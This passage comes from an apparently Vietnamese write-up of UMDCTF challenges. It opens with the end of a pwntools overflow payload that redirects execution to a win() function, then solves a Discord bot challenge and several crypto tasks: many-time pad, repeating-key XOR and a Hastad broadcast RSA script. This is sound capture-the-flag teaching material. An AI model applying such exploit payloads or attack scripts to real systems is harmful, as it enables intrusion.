payload = b'a'*(128+16+96) #128 kí tự cho showDescription, 16 kí tự cho metadata của chunk mainActor, 96 kí tự offset
payload += p64(0x400BED)    #địa chỉ hàm win()
p.sendline(payload)
p.interactive()
```

`FLAG: UMDCTF{b1ns_cAN_B3_5up3r_f4st}`

## Misc
> ### Chungusbot v2

> Check out my code!
>
> NOTE: Browser Discord might be finicky with this challenge.
>
>Author: itsecgary

#### 1. Tìm kiếm thông tin

Tìm được `Chungusbot v2` trên kênh discord của giải  

Tìm được code của bot trong github của giải 

https://github.com/UMD-CSEC/ChungusBot_v2/tree/79b9d00e53fedf9dd587440a95a4bf6fd0b47822

Có 4 file:
- `chungus.py`
- `help_info.py`
- `jokes.txt`
- `tellmy.py `

#### 2. Phân tích source code

Vì mình không chuyên lắm về python cũng như chưa biết về cách code bot bằng discord py  

Nên mình giải bài này bằng cách đoán mò là chính =)))  

#### chungus.py

```py
commands = ["help", "tellme ajoke", "tellme", "tellme theflag"]
start = 'Oh Lord Chungus please '
if str(ctx.channel.type) == "private" and start in str(ctx.content) and str(ctx.content).split(start)[1] in commands:
    print("here")
    first_check, msg = check1(str(ctx.author.avatar_url))
    print(f'\n{first_check}\n{msg}\n')
    if first_check:
        if check2(str(ctx.created_at)):
            await ctx.channel.send(f'`{flag}`')
        else:
            await ctx.channel.send("not the right time my friend")
```
Để vào được `check1` ta cần:
- nhắn riêng với bot trong DM
- có `start` trong tin nhắn
- từ cuối trong tin nhắn nằm là 1 trong các từ nằm trong `commands`  

Nếu `check1` trả ra True thì ta sẽ vào được `check2`  

Nếu `check2` trả ra True thì ta sẽ nhận được flag
#### Check1:
```py
def check1(av):
    r = requests.get(str(av), stream = True)
    if r.status_code == 200:
        r.raw.decode_content = True
        filename = str(str(av).split("/")[-1].split('?')[0])
        path = f'./downloaded_files/{filename}'
        with open(path,'wb') as f:
            shutil.copyfileobj(r.raw, f)
    else:
        return False, "Could not grab your pfp for some reason"
```

Đoạn trên là code để lấy avatar của người đang nhắn với bot  

Nếu không lấy được thì sẽ trả ra `False`, báo lỗi, thoát khỏi `check1`  

```py
img1 = list(Image.open('chungus_changed.jpg').convert("1").getdata())
img2 = list(Image.open(path).convert("1").getdata())

os.system(f"rm {path}")

bigger = len(img1)
if bigger > len(img2):
    bigger = len(img2)

try:
    count = 0
    for i in range(bigger):
        if img1[i] == img2[i]:
            count += 1
except:
    return False, "Image size not the same"
```

`img1` là 1 cái ảnh nào của con bot  

`img2` là avatar của mình  

So sánh 2 ảnh nếu ảnh `len(img1)` < `len(img2)` của mình thì trả ra False  

```py
message = "Percentage of pixels correct: " + str(count / len(img1))
if count / len(img1) > 0.92:
    return True, message
elif count / len(img1) > 0.6:
    return False, message
else:
    return False, f"Images are not the same ({100 * count / len(img1)}%)"
```

Nếu không nhỏ hơn thì sẽ tính toán tỉ lệ phần trăm các pixels giống nhau  

Nếu tỉ lệ hơn `0.92` thì sẽ pass được `check1`  

Ban đầu mình thử với một hình toàn đen thì tỉ lệ lên tới 0.85

![unknown](https://user-images.githubusercontent.com/74854445/156973219-3fafabef-f815-4f8b-b5fe-e883faef476a.png)

```py
@tellme.command()
@in_dms()
async def avatar(self,ctx):
    with open(f'chunga_diff.jpg', 'rb') as f:
        await ctx.channel.send(file=File(f, 'chunga_diff.jpg'))
```
Trong `tellme.py` là code để thực hiện chức năng của các `commands`  

Trong này có thêm một command nữa được code là command `avatar`  

Chức năng của command này là sẽ gửi cho ta 1 bức hình  

Mình thay thử sang bức hình vừa được bot gửi lên thì cũng chỉ mới lên được `0.88`

![image](https://user-images.githubusercontent.com/74854445/156973370-3f6e194d-0f13-480e-8b90-a401d769cb15.png)

Mình dự đoán bức hình được đem so chính là avatar của bot  

Nên đã kiếm trên mạng 1 bức hình rõ nét, tương tự sau đó resize thành `894 x 894` giống size của bức hình được bot gửi lên

![image](https://user-images.githubusercontent.com/74854445/156973453-c8c00ede-6478-4641-bda7-4f325582ed60.png)

Thành công pass được `check1`

#### Check2: 

```py
def check2(hmm):
    something = int(hmm.split(':')[-1].split('.')[0])
    if (something > 45 and something < 50) or (something > 14 and something < 19):
        return True
    return False
```
`check2` sẽ nhận vào thời gian ta gửi tin nhắn cho bot  

`something` = số giây  

=> Chỉ cần canh thời gian gửi tin nhắn hợp lý rồi gửi tin nhắn cho bot là được như 12:28:15

`Flag: UMDCTF{Chungus_15_wh0_w3_str1v3_t0_b3c0m3}`


## Crypto

> ### MTP

Bài cung cấp file `ciphertexts.txt` :

```
c909eb881127081823ecf53b383e8b6cd1a8b65e0b0c3bacef53d83f80fb
cf00ec8a5635095d33bfa12a317bc2789eabf95e090c29abe81dd4339ffb
c700ec851e72124b6afef52c3f37cf2bcda9f74202426fa2f54f9c3797fb
cd0ebe8718365b4f2bebb6277039c469dfecf05419586fb4f658dd2997fb
c341ff8b562114552ff0bb2a702cc3649ea0ff5a085f6fb0f51dd93b86f4
da13f1801321085738bf9e2e24218b7fdfb9f159190c22a1ba49d43381fb
cb0df2c63f721c573ebfba21702fc36e9ea9ee50000c38a5e91ddd7ab0fb
c913e796023d1c4a2befbd367032d82bdfecf55e02406fa7f548ce2997f4
```

Dạng này là many time pad nên khi đi lục lọi mình có tìm được 1 tool khá hay : https://github.com/CameronLonsdale/MTP

![image](https://user-images.githubusercontent.com/72289126/156961230-67072dc0-0ce7-4ad4-baa8-69d863a9de2d.png)

Enter và tiếp tục chỉnh sửa sao cho hợp lý thôi 

![image](https://user-images.githubusercontent.com/72289126/156961341-59c9cdb7-e1da-444f-8f1a-da638c56af75.png)

![image](https://user-images.githubusercontent.com/72289126/156961641-7df509ff-d770-4bd6-afd4-0d19c7fb7795.png)

Sau đó nhấn `ESC` và chọn `Export`  thôi

![image](https://user-images.githubusercontent.com/72289126/156961734-f21464bc-6098-4e66-929f-7c9522df22f9.png)

Kiểm tra file `result.json` ta được kết quả : 

```json
{
  "decryptions": [
    "Chungus is the god of thunder.",
    "Earl grey tea is good for him.",
    "March is a cold season for me.",
    "Go and watch boba fett please.",
    "I am someone who likes to eat!",
    "Professor Katz taught me this.",
    "All I got on the exam was a B.",
    "Cryptography is a cool course!"
  ],
  "key": "8a619ee676527b384a9fd54f505bab0bbecc96316d2c4fc49a3dbc5af2d5"
}
```

```py
import hashlib

if __name__ == '__main__':
    plaintexts = [
"Chungus is the god of thunder.",
"Earl grey tea is good for him.",
"March is a cold season for me.",
"Go and watch boba fett please.",
"I am someone who likes to eat!",
"Professor Katz taught me this.",
"All I got on the exam was a B.",
"Cryptography is a cool course!"
    ]

    pt_str = ''
    for pt in plaintexts:
        pt_str += pt

    print('UMDCTF{' + hashlib.md5(pt_str.encode()).hexdigest() + '}')
```

`Flag: UMDCTF{0a46e0b2b19dc21b5c15435653ffed67}`

> ### Vigenere Xor

Bài cung cấp 3 file `encrypt.py`, `keygen.py` và `ciphertext.txt`

encrypt.py

```py
import random
from binascii import unhexlify, hexlify

KEY_LEN = [REDACTED]

with open('plaintext.txt', 'r') as f:
    pt = f.read()

with open('key.hex', 'r') as f:
    key = unhexlify(f.read().strip())

ct_bytes = []
for i in range(len(pt)):
    ct_bytes.append(ord(pt[i]) ^ key[i % KEY_LEN])

ct = bytes(ct_bytes)
print(hexlify(ct).decode() + '\n')
with open('ciphertext.txt', 'w') as f:
    f.write(hexlify(ct).decode() + '\n')
```

keygen.py

```py
import random
from binascii import hexlify

KEY_LEN = [REDACTED]

keybytes = []
for _ in range(KEY_LEN):
    keybytes.append(random.randrange(0,255))
print(f'key = {bytes(keybytes)}')

key = hexlify(bytes(keybytes)).decode()
with open('key.hex', 'w') as f:
    print(f'key = {key}')
    f.write(key + '\n')
```

Ciphertext.txt

```
1553e3592522585df201e8964d330124a81340e71c634d371a2de646cd0f18e7566c6c135cf757e4db0f361d23ae1d0be053704e271f3ce650c45a50e343626b5d53b801e8db09381b26ed5f0fe148274e2b162cbe1fd11518eb006a635d14e454efdb002e4e39ae4f09fe48740c620136b31fcf1b5ce7006822515df101ec921e230f21a81d0fe81c7547321420af51c55a4ced00647b1357f94cec9e03234e3da44908e1497302370b30a858821b18f252667a4a18b643e4980c221d2fed5447e31c664e301d38a246820e4ae343626b5d53b658ee8e1f324e23bd1340fd55694127582cb41fd11518ea416a695a5af101e89704230b38ac4905a21c734a230c79ab5ac3144ba24967765646f844f5db1d25013ea25e0fe212274d2c1b3ce656821c51ec44297b5c41e401e88b4d3e4e29ac5340eb5d744b2e0179af51d10e59ee4c29631356f742ea9f02381c6ab94f0fe45d69022b162da91fdb154df00079611f14f84ef5db19384e27a85314e75369023b172cb41fc71759eb4c29755a58fa01e39e4d3e006aa04440e65d6946315679a250cc0e18e7566c6c1356f955e99e1f771a3fbf5309e05b274d241e79bf50d70818f24325225151f540f4880877076aae5c0eae4e6857365834a753d51b4ae700606c475bb658ee8e1f771e25ba5812ae4f7e51361d34e64ccd5a51a243686c1340e353efdb14381b38ed5818ed49744762173fe65e821957ef507c765646b64eefdb0c234e2ba34440fa556a476c5830b21fcf135fea5429605614f701e69402334e3ea45005ae486802211937a55ace5a41ed557b225046f345e88f4d340f38a91d13e7526447621135aa1fca1b4ee7007d6a5240b655ee944377072ced5440f95d6956271c79af1fc1154dee4429705658f340f29e4d2e013fbf1d08e15162022b163fa94dcf1b4ceb4f67225c5ae24ea19614771d2fae4812eb1c6e5021583aae5ed65a59ec44296f524df444a1920b771725b84f40fb526b57211320e64ccd175ded4e6c22445dfa4da198023a0b6aa6530fed576e4c255838b21fdb154df0006d6d5c46b801e89f4d3f072da55119ae4f7245251d2ab21fdb154da25468695614ef4ef4894d3b073eb95105ae5f684f2f1d37b21fc31857f754296f5614f440e2904d240724ae5840e71c664f621636e64cc10851f25429695a50f248e4d54d3e4e21a35217ae566654235838a85b821913a9006f6e4651f855ed824d36002eed5001e559274f3b5836b15182095bf04979764014f74fe5db1e381b38ae5840ed5363476c583ba35cc30f4be700606f1355b64fe8980877093fb41d09e25027452b0e3ce646cd0f18e3006a6a525af544a18f02771a2ba65840e7482740231b32e617f7377cc1744f795705f27ef8cb18081b39a8620bba4f2651294906f64dfd3357c11f363d4e1db801f8941877062bbb5840ba1c6f4d370a2ae656cc5a4dec497122475dfb44addb0e3b0129a61d09fd1c734b211330a8588c5a51ee4c296e5640b658ee8e4d3c0025ba1d17e659690236103ce64bcb175da2497a224644b643f8db1e32002ea45307ae456857621937e65acf1b51ee007d6d136fe444e59a0e230b2e901d17e655644a623179a74ed7134ae74429755a40fe01e0db0736182bed4d12e15b75432f5830e655d7094ca2577b6d4751b801f29e08771725b81d14e65969027851799f50d75a4cea496769135de206f2db0b220024b41d14e11c7343291d79b55cd01f5dec53616d4747b64ee7db1d32013aa15847fd1c4964160b75e657d71207a2707b6d4351e455f8db193f0b2cb91d09fd1c6602281732a31fd61518fb4f7c3d137db14deddb0536182fed440ffb1c6c4c2d0f79b257c30e18f6486c225158f942ea9805360724ed590feb4f6905365835af5a8c5a71a24f7e6c135de20fa1be1b32006aa45b40f753720231192fa31fcb0e14a2497d254014fb58a18b1f381e2fbf4919a01c5e4d375838b45a821759e6007d6a5240b658ee8e4d330124ea4940e14b690236103ce65ed00e18f6486876137db64ef69543772a2fa15814eb1c734a230c79b55cd01f5dec53616d471adf45e495193e1a33ed4908eb5a73022b0b79a850d65a59a24a66695618b66be8964c772323a15109e15274022d1e79a05ecf1354eb457a224041f047e4894d32182fbf4440f759665063581bb34b823318ef557a761351ee51ed9a04394e3ea21d19e149274a2d0f79a753ce5a4cea497a225e5de555e09008394e23a95801ae536102261d37a94acc1951ec4729725f51f752f48908770f24a91d10fc5d6e512b163ee64fc31356a25768711356f953efdb0c390a6a841d17e7506b0225112fa31fdb154da24129615c59e64de48f08770f29ae5215e048274d24582dae5a820941f1546c6f1f14f74fe5db082f1e25b85304ae486f4762193ab24ac31618f64568615b5df846f2db02314e3ea55840e94e624336583cbe4fce154ae752296d5514e249e4db19251b3ea51140fa5462022f192ab25ad0575af74965665646b64ee7db0522032ba31d08ef4c774b2c1d2ab511823457a24f67671346f34be4981924426aa95413e2556c47315479a94d821b4eed496d711344fa44e08818250b6aa44913eb50610e621a3ca55ed7095da2497d225a47b651ed9e0c241b38a81140ec497302201d3aa74ad11f18f64866715614e149eedb09384e24a24940e5526855621036b11fd61518f2557b714651b651ed9e0c241b38a81d12ef486e4d2c1935aa46821f56e14f7c6c4751e401e29403240b3bb8580eed597402361038b21fc3085da24571764151fb44ed824d270f23a35b15e212276c2d0a79a758c31356a2497a22475cf353e4db0c391725a35840f95468022e172fa34c82154aa2507c704041f352a1941f770a2fbe5412eb4f27562d5836a44bc31356a250686b5d14f947a19219240b26ab1140ec596443370b3ce656d65a51f10079635a5aba01e38e19770c2fae5c15fd59274d211b38b556cd1459ee4c7022505de442f4961e230f24ae5813ae536441370a79af51820d50eb436122475bff4da19a03334e3aac540eae5f664c62082ba95cd7085da248606f1347f94ce4db0a250b2bb91d10e2596651370a3ce81ff61518f64162671355b655f3921b3e0f26ed5818ef51774e275479b157cb1950a24f6f224647b644f79e1f771b24a95812fa5d6c47315835a75dcd0851ed557a22435cef52e8980c3b4e2fb55812ed5574476e583cbe5cc70a4ca25466225c56e240e8954d240127a81d01ea4a664c36193ea31fc40857ef0060760c14d454f5db1a3f016aa55c13ae5d695b620a30a157d65a4ced006f6b5d50b647e08e01234e3da44908ae5d274f231679b157cd5a5bea4f66715647b655eedb08390425b41d01ae4c6b47230b2cb45a820e50e354296a5247b64feedb0c390025b4540ee91c644d2c0b3cb74ac7145be75325225c46b64eef9e4d200625ed5c16e1556351621979b65ecb1418f64868761344e44ee58e0e321d6aa35240fc5974572e0c38a84b820a54e7417a774151a901ce954d23062fed5214e65975022a1937a213820d5da2446c6c5c41f842e4db1a3e1a22ed4f09e95473472d0d2ae656cc1e51e54e68765a5bf801e09509770a23be5109e559274f271679b157cd5a59f04529715c14f444e68e043b0b2eed5c0eea1c63472f172ba753cb005de6006b7b1340fe44a19805361c27be1d0fe81c774e27192ab34dc75a57e4007d6a5614fb4eec9e0323426abe5240ec506e4c261d3de65ddb5a5ce75360705618b655e99a19771a22a84440ed5d694c2d0c79a050d01f4be74529765b51b651e09203770f24a91d14fc5372402e1d79b257c30e18e3526c22515be34fe5db19384e2fa34e15eb0727432c1c79a34ed71b54a24265635e51b643e49702390939ed490fae486f4d311d79b157cd5a5ee34965225a5ab655e99e04254e2eb84919ae486f502d0d3eae1fd51f59e94e6c714014f947a18c043b0266ed4a08e75f6f022b0b79b257c75a4be34d6c225247b652e0820439096ab95512e149604a620b31b456cc1151ec472964415bfb01f594043b4e2ba35940fe5d6e4c6c580dae5ad11f18e1417a674014f753e4db1d321c2ca85e14e24527512b1529aa5a821b56e6006c63404db655eedb093e1d3ea45307fb55744a6c5810a81fc35a5ef0456c225b5be353addb1a3f0b24ed5215fc1c774d351d2be650c45a5bea4f60615614ff52a18e03231c2ba05005e2506246621937a21fd5125dec00676d475cff4fe6db1d250b3ca85314fd1c685730583ba356cc1d18e34265671340f901e5944d20062bb91d17eb1c6b4b291d79a45ad10e14a2457f67414db651ed9e0c241b38a81d09fd1c734d621a3ce648c7165bed4d6c661355f845a19e1b321c33ed4d01e7522743341730a25ac65418c0557d225a5ab642e48919360724ed5e09fc5f724f310c38a85cc70918e34e6d225c43ff4fe6db19384e3ea55840ed50664b2f0b79a959821e4df659296d4114e249e4db02350223aa5c14e753695162173fe65dd70951ec457a71135de201f692013b4e2cbf5811fb5969562e0179a95cc10f4aa25461634714e64de49a1e221c2fbe1d08ef4a6202361779a45a82085df2556d6b5240f345a19a03334e2ba3530ff75d6941270b79a75cc11f48f6456d2c1360fe44a18c04240b6aa05c0eae486f47301d3fa94dc75a59ee57687b4014fe4eed9f1e770724ed4908eb4f62022f192db25ad00918f64f29765b5de501f18904390d23bd5105ae536102311d35a35cd61357ec1a296a5614e444eb9e0e231d6abd5105ef4f7250270b79b25082095de1557b67135be249e4894d301c2fac4905fc1c774e27192ab34dc70914a24f7b225658e544a19308770b24a94812eb4f2752231137b51fd61518e356666b5714e14ef38808771e2ba45313a01c425a321438af51cb145fa25461634714fe48f2db0a360328a1540ee91c665131173aaf5ed61f18f5417a225c40fe44f38c04240b6aac1d10eb4e6147210c35bf1fd2165de353686c4714ff4fe5921b3e0a3fac514cae506841231479ab5ecc5a72eb4d294a5259f353ee9d0b7b4e7ef41140fa536b46620a3cb650d00e5df05329564651e545e0824d23062bb91d08e74f27402d1732af5a821957f74c6d225151b640a1890836026aa75812e51c704a271679ae5a821e51e64e2e761353f355a19304244e27a25305f71227000b582da353ce5a41ed5525225e4db643ee94063e0b6aaa5814fd1c6602301d38aa1fc01f5da24967225b5de501e39403390b3eed5c0ef7486e4f275810e65bcd141ff60079634a14fe48ecd74d381c6a841d03e1516202370879b557cd084ca24270225214f54ef48b01324e22b85304fc596302200d3aad4c8e5818f1416066137cf74ce48902310866ed530ffa556945620c31a74b820e50e7006b6d5c5ffb40ea9e1f771925b85104ae5e62022a112ae65dc7094ca2467b6b565af201ee9508770323a34814eb1027552a1d37e65e821857fa4967651359f755e2934d200f39ed5e0fe3556945620d29ea1fc00f4ca24129605a40b64ee7db0c771e38a45e0bae486f4762163cbe4b8e5a4fea4567225b51b645e89f03701a6aaa5814ae546e51621b38b557820851e5487d225243f758afdb4f12182fbf4414e6556945621b38a81fc01f18f24568615b4db64ae49e037b4e28b84940fa54624c62317eab1fc35a5ee75729755651fd52a1970c230b6aba5414e61c6602321920ab5acc0e14a24167661347e345e59e033b1766ed5505ae4872502c0b79af51d61518e3006b6b5418b64ce49a03770938b85010a21c63432c1f35af51c55a55e70066745646b640a1990c3b0d25a34440fc5d6e4e2b163ee650d05a4cea526c634751f848ef9c4d23016aaf4f05ef57274f3b5838a854ce1f4bac00476d4418b668a19a093a073eed4908ef48276b621b38a81fc01f18e300656b4740fa44a19e00381a23a25301e21c6a5b311d35a01fd11555e754606f5647ba01e38e1977073eea4e40fb4f72432e1420e656cc5a4ae753796d5d47f301f5944d3f0727ed4e03fc59664f2b163ee648ca1354e700796d5a5ae248ef9c4d364e2db85340ef48274f3b5831a35ec65a59ec4429765b46f340f59e033e002ded490fae576e4e2e5834bf1fc41b55eb4c70225a52b649e4db09380b39a31a14ae5b6256620838af5b8c5818ca416467415bf047a19a09330b2eed4908ef482746270b29af4bc75a4cea4529605c5bfd48e4dc1e77032fbf5e15fc55664e621c30b54fcd0951f649666c1f14fe44a18c0c244e2ba14a01f74f2744371435e650c45a5dec4366774155f144ec9e03234e3da5580eae557302211934a31fd61518e0457d765a5af101ee954d364e7bfb1014e111684c27582ca85bc7085ced472522555be401f6930434066a855c0deb4e684424582ea74c821b48f2526c615a55e248f79e41770c2fae5c15fd5927562a192de654cb145ca24f6f224041e651ee8919770d25b85104ae5e62022a192ba21fd61518e44967661d3e9c
```

Ta thấy ciphertext rất dài và xor với key thì đây là dạng `Xor + Frequency analysis` nhé !

Đầu tiên ta đọc dữ liệu và ghi vào `cpt`

```python
f = open('ciphertext.txt','r')
cpt = bytes.fromhex(f.read())
f.close()
f = open('cpt','wb')
f.write(cpt)
f.close()
```

Đến đây ta có 2 cách :

Cách 1 : Đưa lên https://wiremask.eu/tools/xor-cracker/

Sau khi up file ta thấy len key = 29 là xác suất cao nhất và dowload file đầu về

![image](https://user-images.githubusercontent.com/72289126/156964277-3f2c7f11-f7c1-41bb-b628-34a641b720c2.png)

```python
f = open('c544ff71-85ae-4e83-8533-bf83e24cdc7d','rb')
print(f.read())
#b'okay, kid im done. i doubt you even have basic knowlege of hacking. i doul boot linux so i can run my scripts. you made a big mistake of replying to my comment without using a proxy, because i\'m already tracking youre ip. since ur so hacking iliterate, that means internet protocol. once i find your ip i can easily install a backdoor trojan into your pc, not to mention your email will be in my hands. dont even bother turning off your pc, because i can rout malware into your power system so i can turn your excuse of a computer on at any time. it might be a good time to cancel your credit card since ill have that too. if i wanted i could release your home information onto my secure irc chat and maybe if your unlucky someone will come knocking at your door. id highly suggest you take your little comment about me back since i am no script kiddie. i know java and c++ fluently and make my own scripts and source code. because im a nice guy ill give you a chance to take it back (UMDCTF{d1d_y0u_use_k4s!sk1_0r_IoC???}). you have 4 hours in unix time, clock is ticking. ill let you know when the time is up by sending you an email to [redacted] which I aquired with a java program i just wrote. see you then :) You think it\'s funny to take screenshots of people\'s NFTs, huh? Property theft is a joke to you? I\'ll have you know that the blockchain doesn\'t lie. I own it. Even if you save it, it\'s my property. You are mad that you don\'t own the art that I own. Delete that screenshot.Identity theft is not a joke, Jim! Millions of families suffer every year! But I must explain to you how all this mistaken idea of denouncing pleasure and praising pain was born and I will give you a complete account of the system, and expound the actual teachings of the great explorer of the truth, the master-builder of human happiness. No one rejects, dislikes, or avoids pleasure itself, because it is pleasure, but because those who do not know how to pursue pleasure rationally encounter consequences that are extremely painful. Nor again is there anyone who loves or pursues or desires to obtain pain of itself, because it is pain, but because occasionally circumstances occur in which toil and pain can procure him some great pleasure. To take a trivial example, which of us ever undertakes laborious physical exercise, except to obtain some advantage from it? But who has any right to find fault with a man who chooses to enjoy a pleasure that has no annoying consequences, or one who avoids a pain that produces no resultant pleasure? On the other hand, we denounce with righteous indignation and dislike men who are so beguiled and demoralized by the charms of pleasure of the moment, so blinded by desire, that they cannot foresee the pain and trouble that are bound to ensue; and equal blame belongs to those who fail in their duty through weakness of will, which is the same as saying through shrinking from toil and pain. These cases are perfectly simple and easy to distinguish. In a free hour, when our power of choice is untrammelled and when nothing prevents our being able to do what we like best, every pleasure is to be welcomed and every pain avoided. But in certain circumstances and owing to the claims of duty or the obligations of business it will frequently occur that pleasures have to be repudiated and annoyances accepted. The wise man therefore always holds in these matters to this principle of selection: he rejects pleasures to secure other greater pleasures, or else he endures pains to avoid worse pains. Explaining that his gambling associate was otherwise a perfectly pleasant individual, local man Jim Hameroff, 49, told reporters Tuesday that his bookie could be a real jerk when he didn\'t get his money. "I tell you, my bookie gets a real bee in his bonnet anytime I don\'t pay him, or I come up short by a couple hundred bucks," said Hameroff, noting that the bookmaker would be his best friend one minute, when a boxing match was coming up, but a bit of a prick the next, when he didn\'t get his cash right away. "Everything can be peachy keen, but then I\'m a few weeks late with a payment, and suddenly, he turns into a big, mean grump, dangling me over a balcony railing or threatening to break my ankles. Now, I admit that I can be a little emotional myself sometimes, but it\'s usually in response to him screaming while pointing a gun at my head and threatening to kill my family if he doesn\'t get paid." Hameroff added that despite the bookie\'s mercurial disposition, he was always full of encouragement when it came to betting on a 16-to-one underdog, for which Hameroff was appreciative, because that kind of support could be hard to find.\n\n'
```

`Flag : UMDCTF{d1d_y0u_use_k4s!sk1_0r_IoC???}`

Cách 2 : Dùng https://github.com/hellman/xortool

![image](https://user-images.githubusercontent.com/72289126/156964869-6aa7d8c5-be73-4d4f-b893-acbe5d07aa10.png)

![image](https://user-images.githubusercontent.com/72289126/156965090-f44c2013-d035-4ead-bade-f5eedcc5e733.png)

> ### Snowden

```commandline
nc 0.cloud.chals.io 30279
```

Bài RSA này khi nc vào thì sẽ trả về n,e,c với n khác nhau và e chạy loanh quanh trong mấy giá trị [21,23,25,29,31,..], c = m^e

Dễ thấy nếu e giống nhau (Hastad Broadcast Attack) thì ta dùng CRT và căn e là ra flag

```python
from pwn import *
import json
from sympy.ntheory.modular import crt
r = remote("0.cloud.chals.io", 30279)
list_N = []
list_C = []
while True:
    r.recvuntil(b'(y/n) ')
    r.sendline(b'y')
    data = r.recvline().replace(b"'",b'"')
    params = json.loads(data)
    if params["e"] == 23:
        list_N.append(params["n"])
        list_C.append(params["c"])
    if len(list_N) == 23:
        print(crt(list_N,list_C))
        break
```

output
```commandline
(mpz(54442102057757927511639425841438955248293134344655224749535359401816575839400412456832241078743274472268060115980463075792802496315756346223605463042968120725686010733593718719985515840511451749248322285632148289911597718573538505327191022484690801300618762812665976255984643538776323034611286217264372173299497350562891873803041190472126726015563846514305497037845788237659829984830263744438540265642158987133270227685598970517891038840131524861738908457779168057205558678326539559654928328086093794989547481758499922210431229927845105235138233158179529795305674094135271851899172018300468475811952418608383403487090260972375210346106542722525262217105607387479190719730001614920541668612955655548988967949186762397413839976248328429484759466018751121628729453732096967513300297428834714532222664000856658708408049382660596386879883766605596823531673332092310381571952842198758550290185802192993372708741737373603200893643404782226517824418909733263570527191275392827177208003173226136654266931152590136722539348644819187776538651479158541011732009715488575669039998305340208830341842454572087563296537632854937775617674388447948593951011142796878146892106318957612167234837112199256919749093716850506828869579015858055457714150834413303472806701096358960118853802567658428703370664303029579884645325634231197366458809492231519651659460089558888047704997587055193854451937453649596556112068452456869328832695568536643720153806002081236547594085212262321683633194558042081982701612759015757369482809642346123376974492698557079699540035970183631060680633073040910986632671961658318848939359719094982076098059228306409959334491762805114902718864439719958477059167027671920462346509449920068065336221097280672786557326772020152218057157276842067062742221845815890276002793325951328522965638202430192652706754878026775443155114659749978586026820110490095342058286319728268963900393735842843982323658960995040003521580224942370288724447953301911777794060103429567907444208264080986611835339716031573756152421901512202320549571894307659416805038675671256964515976088599345934745274884068236285885935588795087907662922544405814418221024465600209771740389252382582461190891187196524946214441440943140421791437461605480216456331826482046281344441218403824214722173766545519638300639869605707450614785457923491324548946997874150634378665200515604069083244298317318680871798090834071931778278741446092986277850038874794129417546727542567635270464382987492933597990524140004892680226010188510462126091947047600131949835818955288758411862544545974979938585777337024291073515925992412285246463181212543990730287416908213237063368009889484079436850037126097649310448461112280990478119780456586840660007618577576916971409615305968836646270170811787734081217834421850804826953681915851082840255851841790049391231552026187835575525752342446204167440539767074397500642926719619522142014573245687700712439815262302925266571665430247509632236643142115171338342946151550549287581859798447995887804241268847578908368119182989853360005232783914254537895995741017633493473033889659744964888678754604881786187641798749721783677191696482603763900714808291527545087783406413633107660394730257331144276883651511362456237276638668044584468783560399706437739887322660629398199854928085472184497074706518369210904144701540105465403432180666530926367041317784298748977573436776551169134152655388015903574472298830385235531186788534205053148262986488725667990960365036279390185871140831418805901836568559149446448071809287332187648336227382625619400498470991746862158613749760963344396896755811224632086613744893814751932301109656648063620107199785907511478011075024293176891597409319198819819341981357707901874792418431014275229764905133197487505959063135672762149087187118479334636534729145212681768481976927755131444553898263135879197534510476172328899246908546502215598017088678478462988930017153641341202606413845682351884054623076117055255499369451815758840649700628222208566831645950846956155814087978846457271518071812442504090686884121237718304382392717192649174557715732616482757494173557844927998304677281479835368394209694173088988619381556080502910221102996113161717672875390367640807228382277955692399564370970963771305337727401384509247936765276890534244144146394709556428325894557307216196984652274175335720165695580840807310325070667677811310747812741709176637048261424856818255362004570222549073961853685625626502921105573176784201690880632111586123392844863066473839734652651758050040315614139710447288285129249935912440025506544551570558097476551166348361878674379430798421276923873461505795996951331087838069509118102348609301405547270529731898003302116911156526571032843936829854685101791879062712431840628977712275136570471846413858266307630845495934558102090841460897186048159266286367278614459095010765346679531843483625622758254771197976418788757490030424884467685026544240989369557062034048607545463451182487377517618564464488690560901356441509431074975217846751571809436871282933556192236439318957350547509226088452196347235353324771460534815600348271318035806410552348103757483009285091563972273932085493814253474830608803045457573705053786556825412188016201996976995128707522723235867940746982498200033824173729564470376111839899950023164907644313270490495306075371355231252150260625469362803615521040396495289801591766530036680799433872327612185807197607563512097503022550384425615069715169073520497041057111401438352077211185018702332425221345418622321638193704459599982113842268324227533211497359934759323896474376928311599929792893623068305690707582715737260099271329447703750895492429184364397707019624304353758322723717241059358978001188195667164062320426868728793343073220191877003820333534054026385190896498151362995018830545110723889474726765962988084451710969003989677338479522277685036252172887660714169449708374850394346157544416664226812029058768628421945665085904788639039388867909109469622403474462043205847858160082986599154228013757521633494110984397146372525332529652944735649994218369710884119710166863647366306489428594418298273655887213311844584597121181978117089569235863224825752899844612854843029288604452653569062125188064529379136288488220328388484658296082412194339145516692197503128762337538545151932504707210683318209881989416851966661442751028777009878321253709569495459531056623418735791926647975525867239826032789211052920609502787051542213521301228719564873395643470625754747100516539503172724354555337160618738749674683458361378361382463308134388009851972311429590074652146654379909180155479969852168476646467967950606570962001024649538757348303321332524863512166077521311113327677320299104204107116471710051072907886214985035900468817823756472490310634198256747945596156130135967355797713273083040226841729134373820924726994452681673503405591023487698805502112910451979379109970694906955034745076432749624577630107401844168599233914357374632248797107514047582871654418066801034145306608289571002732956529033990818902485311217054095833727320580272274456732054482154356883332278876956607955538320863800250944713333894676111156306696375218929321965786164581855838243153012657550817275345864160366580569653), 3529891832792498268937615245054840837691684548604044678171108390688208215771666525253391775256424328215629126679837971202573535484498641442972903613652735276028339348618183187420948699088346733349950700626256337023482880204470815107423507682516830042190903661508046971590074140329889036584787121061354191711645707999550906280197204012235508228186432388724811290221058921500520718022857380296996072603958931491358002922309654153919796143493735672408917839172339683941447884366462195913299770156489555922737561183061802902377865670448582449619931393903191454976603068321914969504532663412774346602503426251834550415152884316878870800440807661714826966523643264383844164217053666049080936970364883908573680615125097537567677723168272008264315284947252277798598352194803132437811534575349172633888427195639817808148987293074662197328111468805373044612554259802772516666345091945326469093243955683818577935442005578641705697570371376712283217326930035665294022142888603768123342904899396895282409981410566270981326961276383300838641157808694415621039909994344461468651842941547162605722545589107810785269053083870483035619883424206589968707821845146038181651970791362369990524590352801630038950915450891701233532415071693390198025721268195166681629097998785978290518028182826276792037848734052525007342615913299651800350385183404360667226727864775024603535541527588791905857516309847830018774086721649479154938394845345276437175155189644614611738514431935212588899623959092232290858930589441416021580709346215253196707460284216303910850173956361650488772658522711668696402504242417729595638723791147330822866797908909130774265031221710612726003778151513081863945799280381461636364075046288607757983664908968797602533003336940555411007427658735712162003033687140060544498669154324990297882168365252048420451637625245497173965185558417218432590222896238101895221751629904568687489239798860564226104690161081160945458509780210002038878592399555567812517986196181592867374222601130649006839019852879386622999355378686475510074722161910936745859825246267440058855427630753836260768